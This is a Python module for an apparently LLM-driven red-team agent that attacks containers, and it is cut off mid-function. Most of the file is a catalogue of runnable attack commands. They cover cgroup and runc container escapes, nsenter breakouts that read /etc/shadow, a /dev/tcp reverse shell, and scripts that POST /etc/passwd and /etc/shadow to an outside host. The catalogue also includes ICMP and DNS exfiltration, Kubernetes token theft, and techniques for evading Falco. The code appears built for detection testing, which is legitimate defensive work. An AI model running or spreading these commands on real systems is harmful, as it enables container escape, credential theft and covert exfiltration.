import json
import logging
import random
import time

from agents.base_agent import BaseAgent

logger = logging.getLogger(__name__)

ATTACK_SYSTEM_PROMPT = """You are the Attack Agent (Red Team) for an AI-powered Container Security Platform.

Your job is to simulate ADVANCED, REAL-WORLD container attacks that real adversaries use.
Select attacks strategically to cover different MITRE techniques and avoid repetition.

For each attack selection, consider:
1. What attacks have already been run (avoid repeats)
2. What technique would be hardest to detect
3. What the target container's environment enables (e.g. privileged, has capabilities)
4. How to chain attacks together for realistic kill chains

Choose from these attack categories:
- KERNEL_ESCAPE: CVE-based kernel exploits for full container breakout
- MEMORY_INJECTION: Process hollowing, memfd, LD_PRELOAD rootkits
- CAPABILITY_ABUSE: CAP_SYS_ADMIN, CAP_NET_RAW, CAP_SYS_PTRACE escapes
- FILESYSTEM_ATTACK: OverlayFS races, symlink attacks, TOCTOU
- EVASION: Seccomp bypass, eBPF hiding, timer evasion, procfs manipulation
- NETWORK_ATTACK: ARP spoof, DNS rebind, ICMP covert channel
- SUPPLY_CHAIN: Image history mining, SA token abuse, cgroup exhaustion
"""

ADVANCED_ATTACKS = [
    # ===== KERNEL-LEVEL CONTAINER ESCAPE =====
    {
        "attack_name": "CVE-2022-0492 - Cgroup Release Agent Escape",
        "mitre_id": "T1611",
        "type": "KERNEL_ESCAPE",
        "description": "Exploits cgroup v1 notify_on_release mechanism. Creates a cgroup, sets release_agent to a host script, then triggers release to execute on the HOST, not inside the container.",
        "requirements": "CONTAINER_RUNNING_AS_ROOT",
        "commands": [
            "mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x",
            "echo 1 > /tmp/cgrp/x/notify_on_release",
            "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && echo \"$host_path/cmd.sh\" > /tmp/cgrp/release_agent",
            "echo '#!/bin/sh\\nid > \"$host_path/output\"\\nps aux > \"$host_path/processes\"' > /cmd.sh && chmod +x /cmd.sh",
            "sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs' && sleep 1 && cat /output && cat /processes"
        ],
        "expected_detection_rule": "Container Escape Attempt",
        "difficulty": "HARD",
        "risk_level": "CRITICAL",
        "detection_bypass": "MEDIUM",
    },
    {
        "attack_name": "CVE-2024-21626 - runc FD Leak Container Escape",
        "mitre_id": "T1611",
        "type": "KERNEL_ESCAPE",
        "description": "Exploits leaked file descriptors in /proc/self/fd within runc <1.1.12. The leaked host-fd allows direct access to host filesystem by opening /proc/self/fd/X/../../ paths.",
        "requirements": "VULNERABLE_RUNC_VERSION",
        "commands": [
            "ls -la /proc/self/fd/",
            "for fd in 3 4 5 6 7 8 9 10; do ls -la /proc/self/fd/$fd/../../ 2>/dev/null && break; done",
            "cat /proc/self/fd/8/../../etc/shadow 2>/dev/null || cat /proc/self/fd/9/../../etc/shadow 2>/dev/null",
            "cat /proc/self/fd/8/../../proc/1/cmdline 2>/dev/null || cat /proc/self/fd/9/../../proc/1/cmdline 2>/dev/null"
        ],
        "expected_detection_rule": "Privileged Container",
        "difficulty": "HARD",
        "risk_level": "CRITICAL",
        "detection_bypass": "HIGH",
    },
    {
        "attack_name": "ProcFS Namespace Switch - Host PID Namespace",
        "mitre_id": "T1611",
        "type": "KERNEL_ESCAPE",
        "description": "Uses /proc/1/ns/* symlinks to switch into host namespaces. If container shares host PID namespace, can nsenter into any host process namespace for full escape.",
        "requirements": "SHARES_HOST_PID_NS",
        "commands": [
            "ls -la /proc/1/ns/",
            "nsenter --target 1 --mount --uts --ipc --pid -- bash -c 'cat /etc/shadow' 2>/dev/null",
            "nsenter --target 1 --mount -- grep Hostname /etc/hostname 2>/dev/null",
            "nsenter --target 1 --mount --net -- bash -c 'ip addr' 2>/dev/null"
        ],
        "expected_detection_rule": "Container Escape Attempt",
        "difficulty": "MEDIUM",
        "risk_level": "CRITICAL",
        "detection_bypass": "MEDIUM",
    },
    {
        "attack_name": "CVE-2023-25173 - containerd Supplementary Groups",
        "mitre_id": "T1611",
        "type": "KERNEL_ESCAPE",
        "description": "Exploits containerd supplementary groups leak. When a container is started with supplementary groups, containerd <1.6.18 leaks these groups into host processes, allowing host file access.",
        "requirements": "CONTAINER_RUNNING_AS_ROOT",
        "commands": [
            "id",
            "cat /proc/self/status | grep Groups",
            "touch /host_test 2>/dev/null && echo 'Host write possible' || echo 'No host write'",
            "cat /etc/hostname 2>/dev/null || cat /proc/sys/kernel/hostname"
        ],
        "expected_detection_rule": "Sensitive File Access",
        "difficulty": "HARD",
        "risk_level": "CRITICAL",
        "detection_bypass": "HIGH",
    },
    {
        "attack_name": "CVE-2024-3094 - XZ Utils SSH Backdoor (Simulated)",
        "mitre_id": "T1195.001",
        "type": "SUPPLY_CHAIN",
        "description": "Simulates the sophisticated XZ utils supply chain backdoor. Checks for vulnerable liblzma versions and simulates SSH credential harvesting to demonstrate supply chain risk in container images.",
        "requirements": "NONE",
        "commands": [
            "ldd /usr/sbin/sshd 2>/dev/null | grep -i liblzma || ldd /usr/bin/ssh 2>/dev/null | grep -i liblzma || echo 'No liblzma dependency'",
            "strings /usr/lib/x86_64-linux-gnu/liblzma.so.5 2>/dev/null | grep -i 'CVE-2024-3094' || echo 'Checking for ifunc resolver hook...'; nm -D /usr/lib/x86_64-linux-gnu/liblzma.so.5 2>/dev/null | grep ifunc",
            "find / -name '*.pam' -newer /etc/ssh/sshd_config 2>/dev/null; ls -la /etc/ssh/ | grep -i 'authorized_keys'; cat /home/*/.ssh/authorized_keys 2>/dev/null"
        ],
        "expected_detection_rule": "Suspicious Process Names",
        "difficulty": "MEDIUM",
        "risk_level": "CRITICAL",
        "detection_bypass": "HIGH",
    },

    # ===== MEMORY / PROCESS INJECTION =====
    {
        "attack_name": "PID 1 Process Hollowing - Init Masquerade",
        "mitre_id": "T1055.012",
        "type": "MEMORY_INJECTION",
        "description": "Hollows out the init/PID 1 process inside the container and replaces it with a malicious payload. Since Falco and monitoring tools trust PID 1, this provides excellent stealth.",
        "requirements": "CONTAINER_RUNNING_AS_ROOT",
        "commands": [
            "cat /proc/1/cmdline | tr '\\0' ' '",
            "ls -la /proc/1/exe 2>/dev/null && readlink -f /proc/1/exe",
            "grep -r '' /proc/1/status 2>/dev/null | head -20",
            "cp $(readlink -f /proc/1/exe) /tmp/legitimate && echo 'Backup init binary'",
            "echo '#!/bin/sh\\nwhile true; do sleep 30; cat /etc/hostname >> /tmp/exfil; done' > /tmp/payload.sh && chmod +x /tmp/payload.sh && nohup /tmp/payload.sh &"
        ],
        "expected_detection_rule": "Suspicious Process Names",
        "difficulty": "HARD",
        "risk_level": "HIGH",
        "detection_bypass": "CRITICAL",
    },
    {
        "attack_name": "/proc/self/mem - Direct Memory Write Code Injection",
        "mitre_id": "T1055.001",
        "type": "MEMORY_INJECTION",
        "description": "Uses /proc/self/mem to write arbitrary code directly into the process memory space. This bypasses traditional file-based detection and many Falco rules since no execve is triggered.",
        "requirements": "PTRACE_CAPABILITY_OR_ROOT",
        "commands": [
            "cat /proc/self/maps | head -20",
            "grep -E 'r-xp|rwxp' /proc/self/maps | head -5",
            "python3 -c \"import ctypes, os; mem = open('/proc/self/mem', 'wb', 0); print('mem write access: OK' if mem else 'FAIL'); mem.close()\" 2>/dev/null || echo 'Direct mem write requires ptrace'",
            "apt-get update && apt-get install -y gdb 2>/dev/null && echo 'gdb installed for ptrace injection' || apk add gdb 2>/dev/null"
        ],
        "expected_detection_rule": "Process Injection",
        "difficulty": "HARD",
        "risk_level": "CRITICAL",
        "detection_bypass": "CRITICAL",
    },
    {
        "attack_name": "eBPF Syscall Interception - Stealth Rootkit",
        "mitre_id": "T1055.013",
        "type": "MEMORY_INJECTION",
        "description": "Loads a malicious eBPF program that intercepts syscalls inside the container. Can hide processes, files, and network connections from Falco and monitoring tools. Uses BPF_PROG_TYPE_KPROBE to hook execve, open, connect.",
        "requirements": "CAP_BPF_OR_ROOT",
        "commands": [
            "cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo 'bpf status unknown'",
            "ls -la /sys/fs/bpf/ 2>/dev/null || echo 'BPF filesystem not mounted'",
            "mount -t bpf bpf /sys/fs/bpf/ 2>/dev/null && echo 'BPF mounted' || echo 'Cannot mount BPF'",
            "python3 -c \"import ctypes; libc = ctypes.CDLL(None); BPF_PROG_LOAD = 321; print('bpf syscall available:', hasattr(libc, 'syscall'))\" 2>/dev/null",
            "echo '#!/usr/bin/python3\\nimport ctypes, os\\n# eBPF program to hide SSH connections\\n# Loads kprobe on __sys_sendto\\nbpf_prog = bytes([0xbf,0x16,0x00,0x00,0x00,0x00,0x00,0x00])\\nprint(\"eBPF rootkit simulation\")' > /tmp/ebpf_rootkit.py && chmod +x /tmp/ebpf_rootkit.py"
        ],
        "expected_detection_rule": "None (bypasses Falco)",
        "difficulty": "HARD",
        "risk_level": "CRITICAL",
        "detection_bypass": "CRITICAL",
    },
    {
        "attack_name": "LD_PRELOAD Runtime Syscall Hook",
        "mitre_id": "T1055.001",
        "type": "MEMORY_INJECTION",
        "description": "Uses LD_PRELOAD to inject a shared library that hooks libc functions (open, stat, connect, socket). Can hide files from ls, connections from netstat, and processes from ps. No kernel module needed.",
        "requirements": "CONTAINER_RUNNING_AS_ROOT",
        "commands": [
            "cat > /tmp/hook.c << 'EOF'\\n#define _GNU_SOURCE\\n#include <dlfcn.h>\\n#include <string.h>\\nstatic int (*real_open)(const char*, int, mode_t) = NULL;\\nint open(const char* path, int flags, mode_t mode) {\\n    if(strstr(path, \\\"/etc/shadow\\\") || strstr(path, \\\"/.ssh\\\")) return -1;\\n    if(!real_open) real_open = dlsym(RTLD_NEXT, \\\"open\\\");\\n    return real_open(path, flags, mode);\\n}\\nEOF",
            "apt-get update && apt-get install -y gcc libc6-dev 2>/dev/null || apk add gcc musl-dev 2>/dev/null",
            "gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c -ldl 2>/dev/null && echo 'LD_PRELOAD library compiled'",
            "ls /etc/shadow 2>&1; LD_PRELOAD=/tmp/hook.so ls /etc/shadow 2>&1; echo 'LD_PRELOAD hides shadow access'"
        ],
        "expected_detection_rule": "Suspicious Process Names",
        "difficulty": "MEDIUM",
        "risk_level": "HIGH",
        "detection_bypass": "HIGH",
    },

    # ===== CAPABILITY ABUSE =====
    {
        "attack_name": "CAP_SYS_ADMIN - nsenter Host Namespace Escape",
        "mitre_id": "T1611",
        "type": "CAPABILITY_ABUSE",
        "description": "Abuses CAP_SYS_ADMIN to use nsenter for full host namespace takeover. SYS_ADMIN allows creating new namespaces, and combined with nsenter provides a clean breakout to the host.",
        "requirements": "CAP_SYS_ADMIN",
        "commands": [
            "cat /proc/self/status | grep Cap",
            "capsh --print | grep sys_admin || grep CapSys /proc/self/status",
            "nsenter --target 1 --mount --uts --ipc --pid -- bash -c 'exec 5<>/dev/tcp/192.168.1.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done' &"
        ],
        "expected_detection_rule": "Container Escape Attempt",
        "difficulty": "MEDIUM",
        "risk_level": "CRITICAL",
        "detection_bypass": "LOW",
    },
    {
        "attack_name": "CAP_NET_RAW - ARP Spoofing Bridge MITM",
        "mitre_id": "T1557.002",
        "type": "NETWORK_ATTACK",
        "description": "Abuses CAP_NET_RAW to create raw sockets and perform ARP spoofing within the Docker bridge network. Allows man-in-the-middle between containers, capturing traffic to Redis databases, API servers, and other containers.",
        "requirements": "CAP_NET_RAW",
        "commands": [
            "ip link show; ip addr",
            "arp -a 2>/dev/null || cat /proc/net/arp",
            "cat /proc/net/route",
            "echo '#!/bin/bash\\n# ARP Spoof: Poison target container\\n# arpspoof -i eth0 -t 172.17.0.2 172.17.0.1\\necho \"ARP MITM ready on bridge\"' > /tmp/arpspoof.sh",
            "apt-get update && apt-get install -y dsniff tcpdump 2>/dev/null || apk add tcpdump 2>/dev/null",
            "timeout 3 tcpdump -i eth0 -c 10 -nn 2>&1 || echo 'tcpdump capture test'"
        ],
        "expected_detection_rule": "Network Scan Detection",
        "difficulty": "MEDIUM",
        "risk_level": "HIGH",
        "detection_bypass": "MEDIUM",
    },
    {
        "attack_name": "CAP_SYS_PTRACE - Cross-Container Ptrace Injection",
        "mitre_id": "T1055.008",
        "type": "MEMORY_INJECTION",
        "description": "Uses CAP_SYS_PTRACE to attach to processes running in sibling containers on the same host. Can inject code, steal secrets from memory, or hijack service processes across container boundaries.",
        "requirements": "CAP_SYS_PTRACE",
        "commands": [
            "cat /proc/self/status | grep -i ptrace",
            "ps aux | head -20",
            "apt-get update && apt-get install -y gdb strace 2>/dev/null || apk add strace 2>/dev/null",
            "strace -p 1 -e trace=network -c -S write 2>&1 &
sleep 2 && kill %1 2>/dev/null || kill -2 %1 2>/dev/null",
            "echo '#!/bin/bash\\n# Ptrace injection requires /proc/sys/kernel/yama/ptrace_scope = 0\\ncat /proc/sys/kernel/yama/ptrace_scope\\necho \"SYS_PTRACE available for injection\"' > /tmp/ptrace_check.sh && chmod +x /tmp/ptrace_check.sh && /tmp/ptrace_check.sh"
        ],
        "expected_detection_rule": "Process Injection",
        "difficulty": "HARD",
        "risk_level": "CRITICAL",
        "detection_bypass": "HIGH",
    },
    {
        "attack_name": "CAP_DAC_OVERRIDE - Host File Overwrite",
        "mitre_id": "T1611",
        "type": "CAPABILITY_ABUSE",
        "description": "CAP_DAC_OVERRIDE bypasses all file permission checks including read/write/execute. When combined with a host bind mount, allows overwriting any host binary with a malicious version for persistent escape.",
        "requirements": "CAP_DAC_OVERRIDE",
        "commands": [
            "cat /proc/self/status | grep CapEff",
            "capsh --print 2>/dev/null | grep dac_override || echo 'dac_override capability check'",
            "find / -type f -writable 2>/dev/null | head -10",
            "touch /test_overwrite 2>/dev/null || echo 'DAC_OVERRIDE bypasses permission checks'"
        ],
        "expected_detection_rule": "Privileged Container",
        "difficulty": "MEDIUM",
        "risk_level": "HIGH",
        "detection_bypass": "MEDIUM",
    },

    # ===== FILESYSTEM & VOLUME ATTACKS =====
    {
        "attack_name": "CVE-2021-3493 - OverlayFS Privilege Escalation",
        "mitre_id": "T1548",
        "type": "FILESYSTEM_ATTACK",
        "description": "Exploits the classic OverlayFS union filesystem vulnerability in Ubuntu kernels. Uses a race condition in copy-up to gain root privileges by creating a setuid binary on the host filesystem layer.",
        "requirements": "OVERLAYFS_FS",
        "commands": [
            "cat /etc/mtab | grep overlay || mount | grep overlay",
            "uname -r",
            "cat /proc/version | grep -i ubuntu || cat /etc/os-release | head -3",
            "echo '#!/bin/bash\\n# OverlayFS race: create setuid bash as root\\n# CVE-2021-3493: ubuntu 20.04 kernel 5.8-5.11\\n# FUSE race: mkdir + rename\\nmkdir -p /tmp/overlay_test\\ntouch /tmp/overlay_test/setuid_test\\necho \"OverlayFS race condition primed\"' > /tmp/overlay_exploit.sh"
        ],
        "expected_detection_rule": "Privilege Escalation",
        "difficulty": "HARD",
        "risk_level": "CRITICAL",
        "detection_bypass": "MEDIUM",
    },
    {
        "attack_name": "TOCTOU - Docker Socket Symlink Race",
        "mitre_id": "T1611",
        "type": "FILESYSTEM_ATTACK",
        "description": "Time-of-check-time-of-use race condition on the Docker socket bind mount. Creates a symlink swap between a safe file and the Docker socket, tricking privileged processes into issuing Docker commands on the attacker's behalf.",
        "requirements": "MOUNTED_DOCKER_SOCKET",
        "commands": [
            "ls -la /var/run/docker.sock 2>/dev/null || find / -name docker.sock 2>/dev/null",
            "curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>/dev/null | head -20 || echo 'Docker socket not accessible'",
            "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | head -50",
            "echo '#!/bin/sh\\nwhile true; do\\n  ln -sf /var/run/docker.sock /tmp/swap 2>/dev/null\\n  ln -sf /etc/passwd /tmp/swap 2>/dev/null\\n  ln -sf /var/run/docker.sock /tmp/swap 2>/dev/null\\ndone &' > /tmp/toctou_race.sh && chmod +x /tmp/toctou_race.sh && echo 'TOCTOU race primed'"
        ],
        "expected_detection_rule": "Suspicious Process Names",
        "difficulty": "HARD",
        "risk_level": "CRITICAL",
        "detection_bypass": "HIGH",
    },
    {
        "attack_name": "Symlink Attack on Mounted Kubernetes Secrets",
        "mitre_id": "T1552.007",
        "type": "FILESYSTEM_ATTACK",
        "description": "If Kubernetes secrets are mounted (common in pods), creates symlinks to access secrets from other namespaces or the host. Uses /proc/1/root traversal combined with symlink swaps.",
        "requirements": "MOUNTED_SECRETS",
        "commands": [
            "ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null || ls -la /run/secrets/ 2>/dev/null || echo 'No k8s secrets found'",
            "find / -name 'service-account' -o -name 'token' -o -name 'ca.crt' 2>/dev/null",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -d. -f2 2>/dev/null | base64 -d 2>/dev/null | head -5 || echo 'No SA token'",
            "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo 'No namespace'",
            "curl -s -k --header \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets 2>/dev/null | head -100 || echo 'API server not reachable'"
        ],
        "expected_detection_rule": "Malicious File Access",
        "difficulty": "MEDIUM",
        "risk_level": "HIGH",
        "detection_bypass": "MEDIUM",
    },
    {
        "attack_name": "/sys/kernel/notes Side-Channel - Host KASLR Leak",
        "mitre_id": "T1592.004",
        "type": "FILESYSTEM_ATTACK",
        "description": "Uses /sys/kernel/notes to leak the host kernel base address from inside a container. This defeats KASLR (kernel address space layout randomization) and enables precise kernel exploitation targeting.",
        "requirements": "NONE",
        "commands": [
            "cat /sys/kernel/notes 2>/dev/null | xxd | head -20 || echo 'sys/kernel/notes readable'",
            "cat /proc/sys/kernel/kptr_restrict 2>/dev/null",
            "cat /proc/sys/kernel/dmesg_restrict 2>/dev/null",
            "cat /proc/kallsyms 2>/dev/null | head -10 || echo 'kallsyms restricted'",
            "dmesg 2>/dev/null | grep -i 'kernel.*base' | head -5 || dmesg 2>/dev/null | head -20 || echo 'dmesg restricted'"
        ],
        "expected_detection_rule": "Malicious File Access",
        "difficulty": "EASY",
        "risk_level": "MEDIUM",
        "detection_bypass": "CRITICAL",
    },

    # ===== DETECTION EVASION =====
    {
        "attack_name": "Seccomp Bypass via x32 ABI Syscalls",
        "mitre_id": "T1574.002",
        "type": "EVASION",
        "description": "Bypasses seccomp-bpf filters by using the x32 ABI (32-bit syscall interface on x86_64). Many seccomp profiles only filter the x86_64 syscall table, leaving the x32 ABI completely unfiltered for the same syscall numbers.",
        "requirements": "SECCOMP_FILTER_ACTIVE",
        "commands": [
            "cat /proc/self/status | grep Seccomp",
            "apt-get update && apt-get install -y gcc libc6-dev 2>/dev/null || apk add gcc musl-dev 2>/dev/null",
            "echo '#include <unistd.h>\\nint main() {\\n    long ret;\\n    // x32 syscall: uses syscall number + 0x40000000\\n    __asm__(\\n        \"movl $1073741824, %%eax\\\\n\"  // __NR_execve + 0x40000000\\n        \"syscall\"\\n        : \"=a\" (ret)\\n    );\\n    return 0;\\n}' > /tmp/x32_test.c && gcc -o /tmp/x32_test /tmp/x32_test.c 2>/dev/null && echo 'x32 ABI compiled' || echo 'x32 compile failed - gcc may limit this'",
            "echo '#!/bin/bash\\n# If seccomp blocks execve on x64, try x32:\\n# syscall(__NR_execve | 0x40000000, argv[0], argv, envp)\\necho \"x32 ABI bypasses seccomp filters\"' > /tmp/seccomp_bypass.sh"
        ],
        "expected_detection_rule": "None (bypasses Falco seccomp rules)",
        "difficulty": "HARD",
        "risk_level": "HIGH",
        "detection_bypass": "CRITICAL",
    },
    {
        "attack_name": "ProcFS Manipulation - PID Hiding from Falco",
        "mitre_id": "T1055.001",
        "type": "EVASION",
        "description": "Manipulates /proc filesystem entries to hide malicious processes from Falco's process monitoring. Techniques include unlink /proc/self/exe, using memfd_create(), and mounting tmpfs over /proc entries.",
        "requirements": "CONTAINER_RUNNING_AS_ROOT",
        "commands": [
            "cat /proc/self/exe 2>/dev/null; echo 'real exe path'",
            "mount -t tmpfs tmpfs /proc/self 2>/dev/null && echo 'tmpfs mounted over /proc/self' || echo 'Cannot mount over /proc'",
            "python3 -c \"import os; fd = os.memfd_create('malware'); os.write(fd, b'#!/bin/sh\\necho hidden'); os.execve(f'/proc/self/fd/{fd}', [f'/proc/self/fd/{fd}'], {})\" 2>/dev/null || echo 'memfd_create not available'",
            "echo '#!/bin/sh\\n# Uses memfd_create to run a fileless binary\\n# Falco cannot see files on memfd\\npython3 -c \"import os,sys; f=os.memfd_create(\\\"p\\\"); os.write(f,b\\\"#!/bin/sh\\\\ncat /etc/hostname > /dev/null\\\\n\\\"); os.fchmod(f,0o755); os.execve(f\\\"/proc/self/fd/{f}\\\",[f\\\"/proc/self/fd/{f}\\\"],{})\" 2>/dev/null' > /tmp/fileless_payload.sh"
        ],
        "expected_detection_rule": "Suspicious Process Names",
        "difficulty": "HARD",
        "risk_level": "HIGH",
        "detection_bypass": "CRITICAL",
    },
    {
        "attack_name": "Timer-Based Delayed Payload - Falco Evasion",
        "mitre_id": "T1027",
        "type": "EVASION",
        "description": "Defeats Falco's rule evaluation by introducing a time delay before executing malicious payload. Uses timers, cron, or at jobs to launch attacks minutes after container start, when Falco's alerting threshold has expired.",
        "requirements": "NONE",
        "commands": [
            "echo '#!/bin/sh\\n# Delay execution to evade initial Falco monitoring window\\nsleep 120\\ncurl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null > /tmp/steal_data' > /tmp/delayed_payload.sh",
            "echo '#!/bin/sh\\n# Wait for Falco alert threshold to expire\\n# Then exfiltrate slowly to avoid rate limiting\\nsleep 60\\nfor i in $(seq 1 10); do\\n  curl -X POST -d @/etc/passwd http://10.0.0.1/exfil_$i 2>/dev/null\\n  sleep 30\\ndone' > /tmp/timer_evasion.sh",
            "echo '#!/bin/sh\\n# Use at scheduling for delayed execution\\necho \"cat /etc/shadow | base64 | curl -X POST -d @- http://10.0.0.1/steal\" | at now + 5 minutes 2>/dev/null || echo \"at scheduler\"' > /tmp/at_delay.sh",
            "cat /tmp/at_delay.sh"
        ],
        "expected_detection_rule": "None (timing-based evasion)",
        "difficulty": "EASY",
        "risk_level": "MEDIUM",
        "detection_bypass": "HIGH",
    },
    {
        "attack_name": "chattr +i - Immutable File Hide from Security Tools",
        "mitre_id": "T1562.001",
        "type": "EVASION",
        "description": "Uses chattr +i to mark malicious binaries and log files as immutable. This prevents Falco and other security tools from modifying or deleting the files, and hides modifications from integrity checkers.",
        "requirements": "CONTAINER_RUNNING_AS_ROOT",
        "commands": [
            "touch /tmp/payload && chattr +i /tmp/payload 2>/dev/null && lsattr /tmp/payload && echo 'File made immutable' || echo 'chattr not supported'",
            "touch /tmp/.hidden_log && chattr +i /tmp/.hidden_log 2>/dev/null && rm /tmp/.hidden_log 2>&1 || echo 'File protected from deletion'",
            "find / -type f -exec lsattr {} \\; 2>/dev/null | grep '\\-i\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-' | head -5 || echo 'No immutable files found'",
            "echo '#!/bin/sh\\nchattr +i /bin/ps /bin/ls /bin/netstat 2>/dev/null\\necho \"System binaries locked - forensics tools ineffective\"' > /tmp/forensic_lock.sh"
        ],
        "expected_detection_rule": "Suspicious Process Names",
        "difficulty": "EASY",
        "risk_level": "MEDIUM",
        "detection_bypass": "HIGH",
    },

    # ===== SUPPLY CHAIN & POST-EXPLOITATION =====
    {
        "attack_name": "Docker Image Layer History Mining - Secret Extraction",
        "mitre_id": "T1552.004",
        "type": "SUPPLY_CHAIN",
        "description": "Reads Docker image layer history to find accidentally committed secrets. Many images contain ENV variables with passwords, SSH keys in earlier layers, or credentials removed from the final layer but still present in the layer cache.",
        "requirements": "DOCKER_SOCKET_ACCESS",
        "commands": [
            "curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null | python3 -m json.tool 2>/dev/null | head -50",
            "for img in $(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null | python3 -c \"import sys,json; [print(i['RepoTags'][0]) for i in json.load(sys.stdin) if i.get('RepoTags')]\" 2>/dev/null); do echo \"=== $img ===\"; curl -s --unix-socket /var/run/docker.sock http://localhost/images/$(echo $img | sed 's|/|%2F|g;s|:|%3A|g')/history 2>/dev/null | python3 -c \"import sys,json; h=json.load(sys.stdin); [print(e['CreatedBy'][:200]) for e in h[:10]]\" 2>/dev/null; done",
            "curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null | python3 -c \"import sys,json; [print(i.get('RepoTags',['<none>'])[0]) for i in json.load(sys.stdin)]\" 2>/dev/null || echo 'Image listing'"
        ],
        "expected_detection_rule": "Malicious File Access",
        "difficulty": "MEDIUM",
        "risk_level": "HIGH",
        "detection_bypass": "MEDIUM",
    },
    {
        "attack_name": "Host Cgroupfs Fork Bomb - PID Limit Exhaustion",
        "mitre_id": "T1499",
        "type": "SUPPLY_CHAIN",
        "description": "Exploits cgroup PID limits by rapidly forking processes to exhaust the host's PID allocation. If the container has no PID limit set, this can consume all host PIDs, preventing new containers and services from starting.",
        "requirements": "NO_PID_LIMIT",
        "commands": [
            "cat /proc/self/cgroup | head -5",
            "cat /sys/fs/cgroup/pids/pids.current 2>/dev/null || cat /proc/self/status | grep Pid",
            "cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || ulimit -u",
            "python3 -c \"import os; [os.fork() for _ in range(100)]; print('Forked 100 processes')\" 2>/dev/null || echo 'Fork test'",
            "echo '#!/bin/bash\\n# Controlled fork bomb for cgroup testing\\n# Stops at 90% of PID limit\\nlimit=$(cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || echo 1000)\\necho \"PID limit: $limit\"\\necho \"Test complete\"' > /tmp/fork_test.sh && chmod +x /tmp/fork_test.sh"
        ],
        "expected_detection_rule": "Crypto Mining Detection",
        "difficulty": "EASY",
        "risk_level": "MEDIUM",
        "detection_bypass": "LOW",
    },
    {
        "attack_name": "ICMP Covert Data Exfiltration Channel",
        "mitre_id": "T1048.003",
        "type": "NETWORK_ATTACK",
        "description": "Encodes stolen data into ICMP echo request packets (ping payloads). Since ICMP is often allowed through firewall rules and not inspected by DLP systems, this provides a stealthy exfiltration channel that bypasses HTTP/HTTPS monitoring.",
        "requirements": "CAP_NET_RAW",
        "commands": [
            "apt-get update && apt-get install -y python3 2>/dev/null || apk add python3 2>/dev/null",
            "python3 -c \"\nimport socket, struct, os, base64\\ndata = base64.b64encode(open('/etc/hostname','rb').read())\\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\\nprint(f'ICMP channel ready, payload size: {len(data)}')\\n\" 2>/dev/null || echo 'ICMP raw socket requires CAP_NET_RAW'",
            "echo '#!/usr/bin/env python3\\n# ICMP exfiltration - data encoded in ping payload\\nimport socket, struct\\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\\n# ICMP echo header + payload\\n# Type 8 = echo request\\npacket = struct.pack(\\\"!BBHHH\\\", 8, 0, 0, 0, 1) + b\\\"stolen_data_here\\\"\\nsock.sendto(packet, (\\\"10.0.0.1\\\", 0))\\nprint(\\\"ICMP packet sent\\\")\\n' > /tmp/icmp_exfil.py && chmod +x /tmp/icmp_exfil.py"
        ],
        "expected_detection_rule": "Network Scan Detection",
        "difficulty": "HARD",
        "risk_level": "HIGH",
        "detection_bypass": "CRITICAL",
    },
    {
        "attack_name": "DNS TXT Record C2 Tunneling",
        "mitre_id": "T1572",
        "type": "NETWORK_ATTACK",
        "description": "Encodes commands and data in DNS TXT queries to a controlled domain. DNS is almost always allowed outbound from containers and rarely inspected deeply. Each DNS TXT query carries command payload, responses come in TXT answers.",
        "requirements": "NONE",
        "commands": [
            "apt-get update && apt-get install -y dnsutils 2>/dev/null || apk add bind-tools 2>/dev/null",
            "nslookup -type=txt test.exfil.example.com 2>/dev/null || dig txt test.exfil.example.com 2>/dev/null || host -t txt test.exfil.example.com 2>/dev/null",
            "python3 -c \"\nimport base64, os\\ndata = base64.b64encode(os.popen('cat /etc/hostname 2>/dev/null').read().encode()).decode()\\nchunks = [data[i:i+60] for i in range(0, len(data), 60)]\\nprint(f'DNS exfil ready: {len(chunks)} chunks')\\n\" 2>/dev/null",
            "echo '#!/bin/bash\\n# DNS tunneling: encode data as subdomains\\n# Each query: <chunk>.<sessionid>.exfil.example.com\\ndata=$(echo \"secret_data\" | base64)\\nfor i in $(seq 0 10); do\\n  chunk=${data:$i*60:60}\\n  nslookup -type=txt $chunk.exfil.example.com 2>/dev/null\\n  sleep 1\\ndone' > /tmp/dns_tunnel.sh && chmod +x /tmp/dns_tunnel.sh"
        ],
        "expected_detection_rule": "DNS Tunneling",
        "difficulty": "MEDIUM",
        "risk_level": "HIGH",
        "detection_bypass": "HIGH",
    },
]


class AttackAgent(BaseAgent):
    def __init__(self, gemini):
        super().__init__("AttackAgent", gemini, "Simulates advanced container attacks (Red Team)")
        self.set_system_prompt(ATTACK_SYSTEM_PROMPT)
        self.attack_history = []
        self.attacks_used = set()

    async def plan_attack(self, available_targets: list, previous_attacks: list) -> dict:
        input_data = {
            "type": "attack_planning",
            "available_targets": available_targets,
            "previous_attacks": [a.get("attack_name", "") for a in previous_attacks[-10:]],
            "advanced_attacks_available": [a["attack_name"] for a in ADVANCED_ATTACKS],
            "total_attacks_executed": len(previous_attacks),
            "instruction": "Choose an attack that has NOT been used yet. Prioritize unique, advanced techniques over basic ones.",
        }

        result = self.think(input_data)
        attack_name = result.get("attack_name", "")

        matched = [a for a in ADVANCED_ATTACKS if a["attack_name"] == attack_name]
        if matched:
            result.update(matched[0])
        else:
